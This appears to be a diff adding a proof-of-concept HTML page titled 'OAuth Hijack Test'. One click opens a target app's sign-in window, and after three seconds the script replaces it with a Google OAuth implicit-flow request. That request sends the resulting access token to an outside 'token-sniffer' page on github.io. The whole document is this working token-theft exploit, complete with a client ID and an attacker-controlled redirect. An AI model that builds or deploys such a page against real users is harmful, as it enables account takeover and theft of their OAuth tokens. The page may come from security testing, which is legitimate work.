@@ -1,0 +1,32 @@
+<html>
+  <head>
+    <title>OAuth Hijack Test</title>
+  </head>
+  <body>
+    <h2>Malicious Simulation</h2>
+    <button onclick="launchAttack()">Click to Launch</button>
+
+    <script>
+      function launchAttack() {
+        const victimWindow = window.open("https://app.experience.com/user/signin", "_blank");
+
+        // Wait a few seconds before hijacking the flow
+        setTimeout(() => {
+          try {
+            victimWindow.location.replace(
+              "https://accounts.google.com/o/oauth2/v2/auth?" +
+              "client_id=665903903207-qss5bj8tj43k15gae6otpo5uce67bk64.apps.googleusercontent.com" +
+              "&redirect_uri=https://shivagprasadh.github.io/oAuthTesting.github.io/token-sniffer.html" +
+              "&response_type=token" +
+              "&scope=openid%20email%20profile" +
+              "&prompt=consent"
+            );
+            alert("OAuth flow hijacked.");
+          } catch (e) {
+            console.error("Hijack failed:", e);
+          }
+        }, 3000);
+      }
+    </script>
+  </body>
+</html>
